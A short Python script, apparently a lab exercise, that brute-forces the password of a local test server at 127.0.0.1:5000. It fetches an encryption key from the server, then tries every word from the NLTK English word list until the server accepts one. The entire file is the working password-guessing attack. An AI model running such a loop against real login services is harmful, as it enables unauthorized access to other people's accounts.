import requests
import nltk
from cryptography.fernet import Fernet
nltk.download('words')
from nltk.corpus import words
dict_words = {word: 1 for word in words.words()};

def getKey():
    url = "http://127.0.0.1:5000/getKey"
    r = requests.get(url)
    return r.text;

def getToken(password, key):
    fernet = Fernet(key)
    token = fernet.encrypt(password.encode())
    return token


def hack():
    url = "http://127.0.0.1:5000/"
    cell = {"password": ""}
    key = getKey();
    print(key)
   

    for word in dict_words.keys():
        token = getToken(word, key)
        print("TRY: " + word + "\tTOKEN: " + token.decode())
        cell["password"] = word
        requests.post(url, data=cell)
        answer = requests.get(url + "getAnswer").text
        if (answer == "accept"):
            print("взлом прошел успешно")
            return
   

hack()

